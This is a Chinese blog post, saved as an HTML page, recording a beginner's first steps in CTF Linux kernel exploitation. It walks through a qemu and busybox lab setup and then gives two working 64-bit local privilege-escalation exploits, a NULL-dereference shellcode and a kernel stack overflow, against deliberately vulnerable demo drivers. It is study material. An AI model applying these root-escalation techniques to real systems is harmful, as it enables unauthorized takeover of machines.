@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        CTF KETNEL PWN 入门记录 · p4nda&#39;s blog
+        
+    </title>
+    <link rel="icon" href= /assets/p4nda.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >p4nda@dubhe</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CTF KETNEL PWN 入门记录</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>p4nda@dubhe</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/photo-1515327866270-5801e8c8357f.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            CTF KETNEL PWN 入门记录
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = PWN>PWN</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = CTF>CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = KERNEL>KERNEL</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/04</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。</p>
+<p>最开始参考的是安全客上的两篇文章，都来自<a href="https://o0xmuhe.github.io/" target="_blank" rel="noopener">o0xmuhe</a></p>
+<p><a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">Linux 内核漏洞利用教程（一）：环境配置</a></p>
+<p><a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">Linux 内核漏洞利用教程（二）：两个Demo</a></p>
+<p>本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…）</p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>文中提到的安装依赖库及qemu时，在make menuconfig就很懵…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure>
+<p>突然出现一大堆选项，而且并不知道是干嘛的…</p>
+<p><img src="/img/kernel_pwn_begin/0.png" alt=""></p>
+<p>最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的<strong>Save an Alternate Configuration File</strong>，然后选择默认命名的.config就可以了。</p>
+<p>其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。</p>
+<h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><p>在编译busybox时，需要去掉</p>
+<p>1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统</p>
+<p><img src="/img/kernel_pwn_begin/1.png" alt=""></p>
+<p>2 Networking Utilities -&gt; [] inetd (Internet超级服务器)</p>
+<p><img src="/img/kernel_pwn_begin/2.png" alt=""></p>
+<h2 id="配置busybox"><a href="#配置busybox" class="headerlink" title="配置busybox"></a>配置busybox</h2><p>qemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功）</p>
+<p>首先，在busy-box的根目录下建立_install文件夹，作为文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>在_install中的etc文件中增加inittab文件，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> etc</span><br><span class="line">touch inittab</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>
+<p>增加etc/init.d/rcS文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir init.d</span><br><span class="line"><span class="built_in">cd</span> init.d</span><br><span class="line">touch rcS</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -</span><br></pre></td></tr></table></figure>
+<p>建立完上述文件后，可以制作img镜像了。</p>
+<p>在_install文件夹下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
+<h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>启动gdb的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex <span class="string">"add-auto-load-safe-path <span class="variable">$(pwd)</span>"</span> \</span><br><span class="line">    -ex <span class="string">"file vmlinux"</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64:intel'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span> \</span><br><span class="line">    -ex <span class="string">'break start_kernel'</span> \</span><br><span class="line">    -ex <span class="string">'continue'</span> \</span><br><span class="line">    -ex <span class="string">'disconnect'</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span></span><br></pre></td></tr></table></figure>
+<p>启动qemu的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append <span class="string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init"</span> --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0</span><br></pre></td></tr></table></figure>
+<h1 id="两个Demo"><a href="#两个Demo" class="headerlink" title="两个Demo"></a>两个Demo</h1><h2 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h2><p>编译内核及利用的exp、poc时，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>。</p>
+<p>另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile </p>
+<p>每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。</p>
+<h2 id="NULL-Dereference"><a href="#NULL-Dereference" class="headerlink" title="NULL Dereference"></a>NULL Dereference</h2><p>这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。</p>
+<p>因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。</p>
+<p>和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。</p>
+<p>附64位的exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------shellcode.s -----------------</span><br><span class="line">xor %rax,%rax</span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81081030</span></span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81080e40</span></span><br><span class="line">ret</span><br><span class="line">------------------------<span class="built_in">exp</span>.c ---------------------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug1"</span>, O_WRONLY);</span><br><span class="line">        write(fd, <span class="string">"muhe"</span>, <span class="number">4</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);<span class="comment">//get root shell</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h2><p>这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了…</p>
+<p>在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> eip,user_cs,user_eflags,user_sp,user_ss;</span><br><span class="line"><span class="keyword">char</span> bin_sh[] = <span class="string">"/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *rsp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> i = <span class="number">0x50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> j = <span class="number">0x78</span>;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//"pushq %%ss\n"</span></span><br><span class="line">        <span class="string">"subq %2,%%rsp\n"</span></span><br><span class="line">        <span class="string">"movq %%ss,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rsp\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="comment">//"pushq %%cs\n"</span></span><br><span class="line">        <span class="string">"movq %%cs,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span>        </span><br><span class="line">        <span class="string">"pushq %0\n"</span></span><br><span class="line">        <span class="string">"movq %%rsp,%1\n"</span></span><br><span class="line">        <span class="string">"addq %3,%%rsp"</span></span><br><span class="line">        :<span class="string">"=m"</span>(eip),<span class="string">"=r"</span>(user_sp),<span class="string">"=m"</span>(i),<span class="string">"=m"</span>(j)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">"memory"</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080db0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080bc0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %0,%%rsp\n"</span></span><br><span class="line">        <span class="string">"iretq\n"</span></span><br><span class="line">        :<span class="string">"=m"</span>(user_sp)</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">40</span>);</span><br><span class="line">    eip =(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) get_shell;</span><br><span class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">32</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug2"</span>,O_WRONLY);</span><br><span class="line">    <span class="comment">//exploit</span></span><br><span class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>CTF PWN题的一般套路也有一定的了解了，想拓展一下自己的知识面，开始试着学习</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2018/04/04/0ctf2018/" title= 0ctf 2018 PWN 部分题解 >
+                    <span>Previous Post</span>
+                    <span>0ctf 2018 PWN 部分题解</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMzUzOS8xMDA5NQ==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:p4nda_dubhe@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="/github.com/ret2p4nda" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/panda_Z/activities" class="iconfont-archer zhihu" target="_blank" title="zhihu"></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境配置"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#编译内核"><span class="toc-number">1.1.</span> <span class="toc-text">编译内核</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译busybox"><span class="toc-number">1.2.</span> <span class="toc-text">编译busybox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置busybox"><span class="toc-number">1.3.</span> <span class="toc-text">配置busybox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#启动qemu"><span class="toc-number">1.4.</span> <span class="toc-text">启动qemu</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#两个Demo"><span class="toc-number">2.</span> <span class="toc-text">两个Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#编译内核驱动"><span class="toc-number">2.1.</span> <span class="toc-text">编译内核驱动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NULL-Dereference"><span class="toc-number">2.2.</span> <span class="toc-text">NULL Dereference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernel-Stack-Overflow"><span class="toc-number">2.3.</span> <span class="toc-text">Kernel Stack Overflow</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 9 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/kernel-pwn-start/" >CTF KETNEL PWN 入门记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
